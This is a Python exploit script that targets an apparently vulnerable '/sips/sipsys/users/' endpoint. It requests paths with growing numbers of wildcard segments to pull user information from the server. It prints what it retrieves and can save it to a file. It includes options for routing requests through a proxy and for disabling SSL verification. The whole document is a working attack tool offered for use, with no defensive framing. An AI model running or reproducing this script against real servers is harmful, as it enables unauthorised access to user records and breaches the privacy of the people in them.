import requests
import argparse
import logging
import json
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Set up logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Function to set up a session with retries
def create_session(proxy=None):
    session = requests.Session()

    # Set up retries (3 retries with exponential backoff)
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[404, 500, 502, 503, 504],
        method_whitelist=["GET", "POST"],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    # Set up proxy if provided
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    return session

# Function to retrieve user information from multiple wildcard paths
def get_user_info(base_url, disable_ssl, timeout, verbose, headers, session, output_file, wildcard_depth):
    responses = []  # Store responses for optional file output

    for depth in range(1, wildcard_depth + 1):
        wildcard_path = "/".join(["*"] * depth)  # Create increasing wildcard paths
        exploit_url = f"{base_url}/sips/sipsys/users/{wildcard_path}"

        try:
            if verbose:
                logging.info(f"Sending request to: {exploit_url}")

            response = session.get(exploit_url, verify=not disable_ssl, timeout=timeout, headers=headers)

            if response.status_code == 200:
                logging.info(f"Success! Data retrieved from: {exploit_url}")
                response_content = response.text
                responses.append(f"URL: {exploit_url}\n{response_content}\n")

                if verbose:
                    logging.debug(f"Response content:\n{response_content}")
                
                print(response_content)  # Print response to console
            elif response.status_code == 404:
                logging.warning(f"Resource not found: {exploit_url}")
            else:
                logging.error(f"Failed request. Status Code: {response.status_code}")
                if verbose:
                    logging.debug(f"Response content:\n{response.text}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error occurred: {e}")

    # Save all responses to output file if specified
    if output_file and responses:
        with open(output_file, "w") as file:
            file.write("\n".join(responses))
        logging.info(f"All responses saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Exploit a vulnerable endpoint dynamically using wildcards.")

    parser.add_argument("base_url", help="Base URL of the vulnerable server")
    parser.add_argument("--disable-ssl", action="store_true", help="Disable SSL verification for the request")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout for the HTTP request in seconds")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--headers", type=str, help="Custom headers to include in the request (JSON format)")
    parser.add_argument("--proxy", type=str, help="Proxy server to use for the request (e.g., http://proxy.example.com)")
    parser.add_argument("--output", type=str, help="Output file to save the responses (optional)")
    parser.add_argument("--wildcard-depth", type=int, default=3, help="Maximum depth of wildcards in the URL path (default: 3)")

    args = parser.parse_args()

    headers = {}
    if args.headers:
        try:
            headers = json.loads(args.headers)
        except json.JSONDecodeError:
            logging.error("Invalid JSON format for headers.")
            return

    session = create_session(args.proxy)

    get_user_info(args.base_url, args.disable_ssl, args.timeout, args.verbose, headers, session, args.output, args.wildcard_depth)

if __name__ == "__main__":
    main()
